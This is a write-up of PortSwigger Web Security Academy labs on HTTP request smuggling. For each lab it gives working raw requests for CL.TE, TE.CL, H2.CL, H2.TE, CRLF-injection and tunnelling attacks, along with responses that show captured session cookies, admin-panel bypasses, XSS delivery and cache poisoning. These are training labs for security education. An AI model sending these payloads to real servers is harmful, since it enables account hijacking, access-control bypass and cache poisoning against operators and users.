---
description: https://portswigger.net/web-security/request-smuggling
---

# HTTP request smuggling

### Lab: HTTP request smuggling, basic CL.TE vulnerability

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

```
POST / HTTP/1.1
Host: ac491f171ff8a93ec0ee145b008f0053.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G


```

```
The response:
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```

### Lab: HTTP request smuggling, basic TE.CL vulnerability

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

```
POST / HTTP/1.1
Host: acbe1f7e1f313a50c0e91a8600d300d8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### Lab: HTTP request smuggling, obfuscating the TE header

This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

```
POST / HTTP/1.1
Host: ac221fd91f056f86c0901b2f00480086.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: ch2

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.

```
POST / HTTP/1.1
Host: ac371fb41ec20b23c0f3196d003d0068.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x


```

### Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.

```
POST / HTTP/1.1
Host: ac7a1fe51f526facc0d31f2f00b000cd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e

POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.

```
POST / HTTP/1.1
Host: ac211ff31e2c297bc0f8368f00380022.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Foo: x


```

```
POST / HTTP/1.1
Host: ac211ff31e2c297bc0f8368f00380022.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Foo: x


```

### Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.

```
POST / HTTP/1.1
Host: ac541fc51e0406bbc00b1da200310019.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71

POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1

0


```

```
POST / HTTP/1.1
Host: ac541fc51e0406bbc00b1da200310019.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

88

POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1

0


```

### Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.

To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.

```
POST / HTTP/1.1
Host: ac441f761e2e28c8c09f3536001e00af.web-security-academy.net
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1

Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test


In the response:
<h1>0 search results for 'testPOST / HTTP/1.1
X-mQUPUQ-Ip: 176.88.129.79
Host: ac441f761e2e28c8c09f3536001e00af.web-security-academy.net
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Conten'</h1>
```

```
POST / HTTP/1.1
Host: ac441f761e2e28c8c09f3536001e00af.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-mQUPUQ-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1


```

```
POST / HTTP/1.1
Host: ac441f761e2e28c8c09f3536001e00af.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-mQUPUQ-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1


```

### Lab: Exploiting HTTP request smuggling to capture other users' requests

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.

```
POST / HTTP/1.1
Host: ac9b1f9a1f3193a8c0627f1a007000b2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 346

0

POST /post/comment HTTP/1.1
Host: ac9b1f9a1f3193a8c0627f1a007000b2.web-security-academy.net
Content-Length: 400
Content-Type: application/x-www-form-urlencoded
Cookie: session=LQeznJhDAPIPGT8d0UBLo0BWF67adKIZ

csrf=0Dm49RA5dFde285rdfwdEjElA6lmsfQl&postId=5&name=test&email=test%40test.com&website=https%3A%2F%2Ftest.com&comment=test


In the response:
<p>test

GET /post?postId=5 HTTP/1.1
Host: ac9b1f9a1f3193a8c0627f1a007000b2.web-security-academy.net
Cookie: session=BeJGuvlx6VpTWFRmJI836YrMGL5pZEYE
Cache-Control: max-age=0
Sec-Ch-Ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;96&quot;
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: &quot;Linux&quot;
U</p>
```

```
POST / HTTP/1.1
Host: ac9b1f9a1f3193a8c0627f1a007000b2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 282
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 840
Cookie: session=BeJGuvlx6VpTWFRmJI836YrMGL5pZEYE

csrf=8vbbOlmjIFPZprpGO0oJLLvaoJWhpulJ&postId=5&name=test&email=test%40test.com&website=https%3A%2F%2Ftest.com&comment=test


In the response:
<p>test

GET / HTTP/1.1
Host: ac9b1f9a1f3193a8c0627f1a007000b2.web-security-academy.net
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
Cookie: victim-fingerprint=GNchpUESs9CeWgYNtVGYTMXLJNpKizdP; secret=YD6LF8zOWmUTHIytgWRcsiC48b2jXP4o; session=TOoN1NQwXonLMyqKUT0eAvx42COLc597</p> 
```

```
GET /my-account HTTP/1.1
Host: ac9b1f9a1f3193a8c0627f1a007000b2.web-security-academy.net
Cookie: victim-fingerprint=GNchpUESs9CeWgYNtVGYTMXLJNpKizdP; secret=YD6LF8zOWmUTHIytgWRcsiC48b2jXP4o; session=TOoN1NQwXonLMyqKUT0eAvx42COLc597
Connection: close
```

### Lab: Exploiting HTTP request smuggling to deliver reflected XSS

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to reflected XSS via the User-Agent header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).

```
/post?postId=2
<input required type="hidden" name="userAgent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36">

User-Agent: "><img src=1 onerror="alert(1)

<input required type="hidden" name="userAgent" value=""><img src=1 onerror="alert(1)">
```

```
POST / HTTP/1.1
Host: ac8f1f2a1e8c07bcc0de6445000c007a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 151
Transfer-Encoding: chunked

0

GET /post?postId=2 HTTP/1.1
User-Agent: "><img src=1 onerror="alert(1)
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1


```

### Lab: Exploiting HTTP request smuggling to perform web cache poisoning

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.

To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert document.cookie.

```
POST / HTTP/1.1
Host: ac5a1f391f8ff226c01983e1003f007a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 186
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: exploit-acd51f321fe9f2eec071838c011d0080.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1


```

**Exploit Server ->**

```
File:
	/post
Head:
	HTTP/1.1 200 OK
	Content-Type: text/javascript; charset=utf-8
Body:
	alert(document.cookie)
```

```
POST / HTTP/1.1
Host: ac5a1f391f8ff226c01983e1003f007a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: exploit-acd51f321fe9f2eec071838c011d0080.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1

GET /resources/js/tracking.js HTTP/1.1
Host: ac5a1f391f8ff226c01983e1003f007a.web-security-academy.net
Connection: close


```

### Lab: Exploiting HTTP request smuggling to perform web cache deception

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is caching static resources.

To solve the lab, perform a request smuggling attack such that the next user's request causes their API key to be saved in the cache. Then retrieve the victim user's API key from the cache and submit it as the lab solution. You will need to wait for 30 seconds from accessing the lab before attempting to trick the victim into caching their API key.

```
POST / HTTP/1.1
Host: ace71f2d1eedc8d0c0fedc99006900c7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X


```

Open Home dir with incognito window -> Proxy History -> GET /resources/js/tracking.js HTTP/1.1

```
<p>Your username is: administrator</p>
<div>Your API Key is: 2Y1HbJNRjBiebORIp1A8jIzAuOGcFT9j
```

### Lab: H2.CL request smuggling

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, perform a request smuggling attack that causes the victim's browser to load a malicious JavaScript file from the exploit server and call alert(document.cookie). The victim user accesses the home page every 10 seconds.

From the Repeater menu, enable the Allow HTTP/2 ALPN override option and disable the Update Content-Length option.

```
POST / HTTP/2
Host: ac501f051ece97dbc0a1303700100057.web-security-academy.net
Content-Length: 0

test

---------------------
The response:
HTTP/2 200 OK
---------------------
GET /resources HTTP/2
Host: ac501f051ece97dbc0a1303700100057.web-security-academy.net
Content-Length: 0


---------------------
The response:
HTTP/2 302 Found
Location: https://ac501f051ece97dbc0a1303700100057.web-security-academy.net/resources/
Content-Length: 0
---------------------
POST / HTTP/2
Host: ac501f051ece97dbc0a1303700100057.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1

---------------------
HTTP/2 302 Found
Location: https://foo/resources/
Content-Length: 0
```

**Exploit Server ->**

```
File:
	/resources
Body:
	alert(document.cookie)
```

```
POST / HTTP/2
Host: ac501f051ece97dbc0a1303700100057.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-ac811fc61e92976bc04630f801a40001.web-security-academy.net
Content-Length: 5

x=1
```

### Lab: Response queue poisoning via H2.TE request smuggling

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 15 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.

```
POST / HTTP/2
Host: ac161f831fbebea4c0e6073100420085.web-security-academy.net
Transfer-Encoding: chunked

0

test


The response:
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=ooYhU0IgBNoOagD6GFarHR5KkIgCw1ra; Secure; HttpOnly; SameSite=None
Content-Length: 11

"Not Found"
```

```
POST /x HTTP/2
Host: ac161f831fbebea4c0e6073100420085.web-security-academy.net
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: ac161f831fbebea4c0e6073100420085.web-security-academy.net


```

> Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.

```
GET /my-account HTTP/1.1
Cookie: session=ZpGG1CFeTzujpRdpenf95S7ccreI7lna

In the response:
Your username is: administrator

GET /admin/delete?username=carlos HTTP/1.1
Cookie: session=ZpGG1CFeTzujpRdpenf95S7ccreI7lna
```

### Lab: HTTP/2 request smuggling via CRLF injection

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.

**Add header in HTTP/2 ->**

```
name:
	foo
value:
	bar\r\n
	Transfer-Encoding: chunked
	
The response:
HTTP/2 404 Not Found
```

Change the body of the request to the following:

```
0

POST / HTTP/1.1
Host: ac3d1f8b1ffcd7aec0df62ab00d600fd.web-security-academy.net
Cookie: session=7TbuVfVnLGXzveAvmelbFtXrQxu9UK7Y
Content-Length: 800

search=x


In the response:
xGET / HTTP/1.1 Host: ac3d1f8b1ffcd7aec0df62ab00d600fd.web-security-academy.net
Cookie: victim-fingerprint=HpcUyPrVLhMBgsprRYeDVsHWYPZ7St5x; secret=8G7woBMWnQ35tZjgE3ODyDZ2N8fmtrk7; session=HAmu42Niwy1wIPrHSX6a5iABh28aUgQS; _lab_analytics=jXujKDjNESNLJkrwTjEXxeltdFYHuLxTYcCNA0EGRSqSvjJxsUiH9N
```

### Lab: HTTP/2 request splitting via CRLF injection

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 10 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.

**Add header in HTTP/2 ->**

```
Name:
	foo
Value:
	bar\r\n
	\r\n
	GET /x HTTP/1.1\r\n
	Host: ac4f1f611fa32a93c0af8a0d004100c6.web-security-academy.net
	
In the response:
Cookie: session=fpt9EQS93Ed7TBfqPG4tCtjzcfANcXna
```

```
GET /admin/delete?username=carlos HTTP/1.1
Host: ac4f1f611fa32a93c0af8a0d004100c6.web-security-academy.net
Cookie: session=fpt9EQS93Ed7TBfqPG4tCtjzcfANcXna
```

### Lab: Bypassing access controls via HTTP/2 request tunnelling

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names. To solve the lab, access the admin panel at /admin as the administrator user and delete carlos.

The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks. However, it is still vulnerable to request tunnelling.

```
GET / HTTP/2
Name:
	foo
Value:
	bar\r\n
	Host: ABC
	
The response:
Server Error: Gateway Timeout (3) connecting to ABC
```

```
POST / HTTP/2

search=portswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswigger

Name:
	foo: bar\r\n
	Content-Length: 500\r\n
	\r\n
	search=x

Value:
	xyz
	
In the response:
<h1>0 search results for 'x: xyz
Content-Length: 337
cookie: session=T1p0u6NkaZvjyU1Eq0k32kklyE8Q6iZs
X-SSL-VERIFIED: 0
X-SSL-CLIENT-CN: null
X-FRONTEND-KEY: 8182935879716184

search=portswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswiggerportswigge'
</h1>
```

> In the main body of the request (in the message editor panel) append arbitrary characters to the original search parameter until the request is longer than the smuggled Content-Length header.

```
HEAD / HTTP/2

Name:
	foo: bar\r\n
	\r\n
	GET /admin/delete?username=carlos HTTP/1.1\r\n
	X-SSL-VERIFIED: 1\r\n
	X-SSL-CLIENT-CN: administrator\r\n
	X-FRONTEND-KEY: 8182935879716184\r\n
	\r\n
Value:
	xyz
```

### Lab: Web cache poisoning via HTTP/2 request tunnelling

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and doesn't consistently sanitize incoming headers.

To solve the lab, poison the cache in such a way that when the victim visits the home page, their browser executes alert(1). A victim user will visit the home page every 15 seconds.

The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks. However, it is still vulnerable to request tunnelling.

```
GET / HTTP/1.1
HTTP/1.1 200 OK
Content-Length: 7435

HEAD / HTTP/2

Name:
	:path
Value:
	/ HTTP/1.1\r\n
	Host: ac651f9d1f5b0382c02f1e5800ce00d1.web-security-academy.net\r\n
	\r\n
	GET /resources?<script>alert(1)</script>(put 7500 chars here)  HTTP/1.1\r\n
	Foo: bar
```
